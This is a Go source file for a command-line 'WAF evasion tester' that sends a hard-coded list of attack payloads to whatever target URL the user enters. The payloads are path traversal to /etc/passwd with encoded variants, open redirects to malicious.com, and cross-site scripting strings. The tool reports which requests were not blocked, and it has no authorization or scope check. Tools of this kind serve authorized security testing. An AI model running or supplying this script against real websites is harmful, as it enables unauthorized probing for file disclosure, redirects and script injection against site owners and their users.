package main

import (
    "bufio"
    "fmt"
    "net/http"
    "os"
    "strings"
)

func main() {
    fmt.Println("Web Application Firewall (WAF) Evasion Tester")

    // Ask for target website URL
    fmt.Print("Enter your target website URL: ")
    reader := bufio.NewReader(os.Stdin)
    targetURL, _ := reader.ReadString('\n')
    targetURL = strings.TrimSpace(targetURL)

    // Test for common evasion techniques
    testEvasion(targetURL)
}

func testEvasion(targetURL string) {
    fmt.Println("\nTesting for WAF Evasion on:", targetURL)

    // Common evasion payloads
    payloads := []string{
        "/?=payload",
        "/?payload",
        "/?p=ayload",
        "/?a=pl",
        "/%09/",
        "/.randomstring/",
        "/?param=a%2fb",
        "/..;/",
        "/%2e%2e%2f",
        "/%252e%252e%252f",
        "/../../../../etc/passwd",
        "/../../../etc/passwd",
        "/../../../../../etc/passwd",
        "/../../../../../../etc/passwd",
        "/../../../../../../../../etc/passwd",
        "/?redirect=http://malicious.com",
        "/?next=http://malicious.com",
        "/?redirect=https://malicious.com",
        "/?next=https://malicious.com",
        "/<script>alert(1)</script>",
        "/<img src=x onerror=alert(1)>",
        "/<svg/onload=alert(1)>",
        "/<body onload=alert(1)>",
        "/?param=<script>alert(1)</script>",
        "/?param=<img src=x onerror=alert(1)>",
        "/?param=<svg/onload=alert(1)>",
        "/?param=<body onload=alert(1)>",
    }

    // Iterate through payloads and send requests
    for _, payload := range payloads {
        // Construct the URL with payload
        testURL := targetURL + payload

        // Send GET request
        resp, err := http.Get(testURL)
        if err != nil {
            fmt.Println("Error:", err)
            continue
        }
        defer resp.Body.Close()

        // Check if the response indicates evasion
        if resp.StatusCode == http.StatusOK {
            fmt.Printf("[+] Payload '%s' did not trigger WAF\n", payload)
        } else {
            fmt.Printf("[-] Payload '%s' triggered WAF (Status Code: %d)\n", payload, resp.StatusCode)
            fmt.Println("[+] You might want to investigate further to confirm if it's a WAF blocking or another issue.")
        }
    }
}
